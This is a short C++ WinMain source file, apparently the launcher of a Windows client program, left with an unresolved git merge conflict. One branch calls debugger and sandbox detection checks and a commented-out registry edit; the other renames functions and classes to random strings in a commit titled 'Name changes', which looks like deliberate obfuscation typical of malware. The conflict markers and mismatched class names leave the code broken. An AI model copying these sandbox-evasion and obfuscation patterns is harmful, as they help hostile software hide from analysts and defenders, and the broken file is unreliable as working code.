#include "client.h"
#include <csignal>
#include "startup.h"

fb693ll7iddh332* client = nullptr;


int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
<<<<<<< HEAD
	if (CheckDebugger() || IsSandbox()) {
		// return 0;
		;
	}

	//EditRegistry();
	client = new Client();
=======
	b7nmffhhcb55ps4();
	client = new fb693ll7iddh332();
>>>>>>> f180b86 (Name changes)

	delete client;

	return 0;
}